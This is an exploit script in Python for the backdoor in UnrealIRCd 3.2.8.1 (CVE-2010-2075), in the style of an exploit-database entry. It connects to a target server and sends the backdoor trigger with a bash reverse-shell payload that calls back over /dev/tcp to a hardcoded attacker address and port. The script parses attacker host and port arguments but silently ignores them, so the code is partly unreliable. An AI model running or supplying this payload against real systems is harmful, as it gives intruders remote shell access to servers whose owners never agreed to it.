# Exploit Title: UnrealIRCd 3.2.8.1 - Backdoor Command Execution
# Date: 18/04/2024
# Exploit Author: JHacKL
# Version: 3.2.8.1
# Tested on: Ubuntu 16.04.6 LTS
# CVE : CVE-2010-2075

#!/bin/python3

import socket
import argparse

class bcolors:
  HEADER = '\033[95m'
  OKBLUE = '\033[94m'
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  FAIL = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

class UnrealIRCDExploit:
    def __init__(self, rhost, rport, lhost, lport):
        self.rhost = rhost
        self.rport = rport
        self.lhost = lhost
        self.lport = lport

    def exploit(self):
        try:
            print(f"{bcolors.OKBLUE}[*]{bcolors.ENDC} Connecting to {self.rhost}:{self.rport}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.rhost, self.rport))
            print(f"{bcolors.OKGREEN}[+]{bcolors.ENDC} Connected successfully.")

            # Recibir banner
            banner = s.recv(1024).decode()
            print(f"{bcolors.OKBLUE}[*]{bcolors.ENDC} Received banner:\n")
            print(banner)
            print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} ! This is expected !")

            # Preparar payload con dirección IP y puerto del atacante
            payload = f"AB;bash -c '0<&205-;exec 205<>/dev/tcp/192.168.198.128/4444;sh <&205 >&205 2>&205'\n"
            payload = payload.encode()

            # Enviar comando de backdoor
            print(f"{bcolors.OKBLUE}[*]{bcolors.ENDC} Sending backdoor command...")
            s.send(payload)
            print(f"{bcolors.OKGREEN}[+]{bcolors.ENDC} Payload sent successfully.")

            s.close()
        except Exception as e:
            print(f"{bcolors.FAIL}[!]{bcolors.ENDC} Error: {e}")

def main():
    # Parsear argumentos de línea de comandos
    parser = argparse.ArgumentParser(description="UnrealIRCD Exploit")
    parser.add_argument("target_host", type=str, help="Target host")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("attacker_host", type=str, help="Attacker host")
    parser.add_argument("attacker_port", type=int, help="Attacker port")
    args = parser.parse_args()

    # Crear una instancia del exploit y ejecutarlo
    exploit = UnrealIRCDExploit(args.target_host, args.target_port, args.attacker_host, args.attacker_port)
    exploit.exploit()

if __name__ == "__main__":
    main()
